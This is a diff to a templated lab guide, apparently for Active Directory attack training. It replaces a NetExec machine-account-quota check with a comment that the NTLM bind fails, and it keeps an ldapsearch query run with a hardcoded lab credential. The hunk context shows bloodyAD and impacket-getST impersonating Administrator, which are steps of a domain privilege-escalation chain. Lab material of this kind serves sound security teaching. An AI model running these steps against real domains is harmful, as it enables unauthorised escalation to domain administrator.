@@ -29,8 +29,7 @@ bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadO
     <pre>export DC={{ ad_dc_ip }}
 export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
 
-nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M maq
-
+# nxc ldap -M maq no funciona contra este DC (falla el bind NTLM, ver AD 02); ldapsearch sí:
 ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
   -b "$BASEDN" -s base '(objectClass=*)' 'ms-DS-MachineAccountQuota'
 # ms-DS-MachineAccountQuota: 10   → &gt; 0 significa que podemos crear equipos</pre>
@@ -83,8 +82,7 @@ impacket-getST -spn 'cifs/{{ ad_dc_fqdn }}' -impersonate Administrator \
     <pre>export DC={{ ad_dc_ip }}
 export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
 
-nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M maq
-
+# nxc ldap -M maq no funciona contra este DC (falla el bind NTLM, ver AD 02); ldapsearch sí:
 ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
   -b "$BASEDN" -s base '(objectClass=*)' 'ms-DS-MachineAccountQuota'
 # ms-DS-MachineAccountQuota: 10   → &gt; 0 means we can create computers</pre>
